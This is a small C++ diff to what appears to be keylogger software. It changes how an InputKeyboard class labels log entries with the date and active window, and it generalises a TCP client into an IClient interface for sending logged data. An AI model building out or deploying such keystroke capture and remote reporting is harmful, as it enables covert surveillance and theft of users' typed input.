@@ -20,13 +20,13 @@ void InputKeyboard::format(std::streamoff logSize)
 	if (PreviousWindow != activeWindows) {
 		if (logSize > 0)
 			_format = "\n";
-		_format += StaticTools::GetDate() + " | " + activeWindows + " | ";
+		_format += StaticTools::GetDate() + " | " + ((activeWindows.empty()) ? "NONE" : activeWindows) + " | ";
 		PreviousWindow = activeWindows;
 	}
 	else if (diff.count() > 1.f) {
 		if (logSize > 0)
 			_format = "\n";
-		_format += StaticTools::GetDate() + " | " + activeWindows + " | ";
+		_format += StaticTools::GetDate() + " | " + ((activeWindows.empty()) ? "NONE" : activeWindows) + " | ";
 	}
 	LastKeyboardActivity = boost::chrono::system_clock::now();
 }
@@ -37,7 +37,7 @@ AInputType &InputKeyboard::operator>>(LogFile &logger)
 	return (*this);
 }
 
-AInputType &InputKeyboard::operator>>(TCPClient &client)
+AInputType &InputKeyboard::operator>>(IClient &client)
 {
 	JSONBuilder builder;
 
